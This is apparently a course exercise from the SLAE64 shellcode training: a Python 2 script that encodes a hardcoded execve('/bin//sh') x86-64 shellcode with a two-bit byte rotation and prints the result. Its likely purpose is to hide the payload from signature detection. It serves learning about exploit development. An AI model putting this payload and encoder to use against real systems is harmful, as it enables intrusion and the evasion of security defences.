#!/usr/bin/env python

#-----------------------------------------------------------------------------
#
# encoder.py
# by Michael Born (@blu3gl0w13)
# Student-ID: SLAE64-1439
# November 8, 2016
#
#----------------------------------------------------------------------------


# handle our imports

import sys


#-------------------------------------------------------------------
#
# The following Bitwise rotation functions
# have been translated from the following blog
# http://www.falatic.com/index.php/108/python-and-bitwise-rotation
#-------------------------------------------------------------------

def ror(valueToBeRotated, rotateAmount):

  return ((valueToBeRotated & 0xff) >> rotateAmount % 8) | (valueToBeRotated << (8 - (rotateAmount % 8)) & 0xff)



def rol(valueToBeRotated, rotateAmount):

  return ((valueToBeRotated << (rotateAmount % 8)) & 0xff) | ((valueToBeRotated & 0xff) >> (8 - (rotateAmount % 8)))


shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")



encshellcode = ""
encshellcode2 = ""

for i in bytearray(shellcode):

  x = ror(i, 2)
  #x = i >> 2
  encshellcode += "\\x%02x," % x
  encshellcode2 += "0x%02x," % x


print "\n\nEncoded Shellcode: %s" % encshellcode
print "Encoded Shellcode 2: %s\n\n" % encshellcode2

